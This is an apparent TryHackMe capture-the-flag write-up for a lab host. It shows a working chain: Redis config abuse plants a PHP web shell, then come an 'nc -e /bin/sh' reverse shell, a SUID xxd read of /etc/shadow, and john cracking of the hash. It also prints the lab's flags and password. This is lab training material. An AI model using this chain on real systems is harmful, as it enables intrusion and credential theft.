``IP:`` 10.10.161.209

## Enumeration
##### Nmap
```r
nmap -sV -sC 10.10.161.209 -p- --open
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 21:27 EST
Nmap scan report for 10.10.161.209
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
6379/tcp open  redis   Redis key-value store 6.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.79 seconds

```
I used the ``--open flag`` to tell nmap to run the ``version`` and ``script scan`` only on ``open ports``.
Found two open ports:
- SSH running on port 22
- Redis running on port 6379

### Q/A
Answer the questions below

Scan the machine, how many ports are open?
``Answer:`` 2

What's is the database management system installed on the server?  
``Answer:`` Redis

What port is the database management system running on?  
``Answer: ``6379

What's is the version of management system installed on the server?  
``Answer:`` 6.0.7

Compromise the machine and locate user.txt
``Answer:`` thm{red1s_rce_w1thout_credent1als}

What is the local user account password?
```r
redis-cli -h 10.10.161.209
10.10.161.209:6379> dir
(error) ERR unknown command `dir`, with args beginning with: 
10.10.161.209:6379> config set dir /var/www/html
OK
10.10.161.209:6379> config set dbfilename shell.php
OK
10.10.161.209:6379> set test "<?php system($_GET[cmd]); ?>"
OK
10.10.161.209:6379> 
10.10.161.209:6379> save
OK
10.10.161.209:6379> 
```

I went to the webpage running port 80 and issued this command from the browser:
```
http://10.10.161.209/shell.php?cmd=nc -e /bin/sh 10.9.105.150 4444
```
while I started netcat on my host machine to capture the ``reverse shell``
``nc -lvnp 4444``

I was able to login as ``www-data``
```r
nc -lnvp 4444            
listening on [any] 4444 ...
connect to [10.9.198.175] from (UNKNOWN) [10.10.161.209] 34922
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
I was enumeration the compromised host and i noticed a user called ``vianka``. And I was able to change directory into that user and view the user.txt flag

```r
www-data@ubuntu:/etc$ cd ..
cd ..
www-data@ubuntu:/$ cd home
cd home
www-data@ubuntu:/home$ ls
ls
vianka
www-data@ubuntu:/home$ cd vianka
cd vianka
www-data@ubuntu:/home/vianka$ ls -l
ls -l
total 8
drwxrwxr-x 7 vianka vianka 4096 Sep  2  2020 redis-stable
-rw-rw-r-- 1 vianka vianka   35 Sep  2  2020 user.txt
www-data@ubuntu:/home/vianka$ cat user.txt
cat user.txt
thm{red1s_rce_w1thout_credent1als}
www-data@ubuntu:/home/vianka$ 
```

To elevate out user account, we need to find something to escalate our privileges and to do this we can look for the SUID permissions with this command:

```r
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
<perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null                   
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40152 Jan 27  2020 /bin/mount
-rwsr-xr-x 1 root root 40128 Mar 26  2019 /bin/su
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27608 Jan 27  2020 /bin/umount
-rwxr-sr-x 1 root shadow 35600 Apr  9  2018 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 35632 Apr  9  2018 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root tty 27368 Jan 27  2020 /usr/bin/wall
-rwsr-xr-x 1 root root 71824 Mar 26  2019 /usr/bin/chfn
-rwxr-sr-x 1 root mlocate 39520 Nov 17  2014 /usr/bin/mlocate
-rwxr-sr-x 1 root shadow 62336 Mar 26  2019 /usr/bin/chage
-rwsr-xr-x 1 root root 18552 Mar 18  2020 /usr/bin/xxd
-rwxr-sr-x 1 root shadow 22768 Mar 26  2019 /usr/bin/expiry
-rwxr-sr-x 1 root crontab 36080 Apr  5  2016 /usr/bin/crontab
-rwsr-xr-x 1 root root 39904 Mar 26  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 136808 Jan 31  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 54256 Mar 26  2019 /usr/bin/passwd
-rwxr-sr-x 1 root tty 14752 Mar  1  2016 /usr/bin/bsd-write
-rwsr-xr-x 1 root root 75304 Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40432 Mar 26  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-r-sr-xr-x 1 root root 13628 Sep  1  2020 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 14320 Sep  1  2020 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
www-data@ubuntu:/var/www/html$ LFILE=/etc/shadow
```
The xxd program looks suspicious. Let go check [GTO - XXD](https://gtfobins.github.io/gtfobins/xxd/).
```r
File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.
```

We were able to use the above techniques to read the ``/etc/shadow ``file and also the ``/etc/passwd`` file
```r
www-data@ubuntu:/var/www/html$ LFILE=/etc/shadow
LFILE=/etc/shadow
xxd "$LFILE" | xxd -r
xxd "$LFILE" | xxd -r
root:!:18507:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
```

Save both files on your local machine and unshadow it

```r
unshadow passwd shadow               
vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:1000:1000:Res,,,:/home/vianka:/bin/bash
➜  RES eza -l                                                       
.rw-r--r--   49 root 26 Feb 22:23 passwd
.rw-r--r-- 1.5k root 26 Feb 22:12 password.txt
.rw-r--r--  125 root 26 Feb 22:22 shadow
➜  RES nano hash    
➜  RES john --wordlist=/usr/share/wordlists/rockyou.txt hash        
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beautiful1       (vianka)     
1g 0:00:00:00 DONE (2024-02-26 22:24) 2.083g/s 3200p/s 3200c/s 3200C/s kucing..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
``Answer: ``beautiful1


``Question:`` Escalate privileges and obtain root.txt
Let log in as ``vianka``

```r
www-data@ubuntu:/var/www/html$ su vianka
su vianka
Password: beautiful1
cd ..
vianka@ubuntu:/$ 
```

Vianka is able to run as root without restrictions (bad idea)
```r
vianka@ubuntu:/$ sudo -l
sudo -l
[sudo] password for vianka: beautiful1

Matching Defaults entries for vianka on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vianka may run the following commands on ubuntu:
    (ALL : ALL) ALL
vianka@ubuntu:/$ 
```

Let's get the root.txt file

```r
vianka@ubuntu:/$ sudo ls /root/
sudo ls /root/
root.txt
vianka@ubuntu:/$ sudo cat /root/root.txt
sudo cat /root/root.txt
thm{xxd_pr1v_escalat1on}
vianka@ubuntu:/$ 
```
``Answer: ``thm{xxd_pr1v_escalat1on}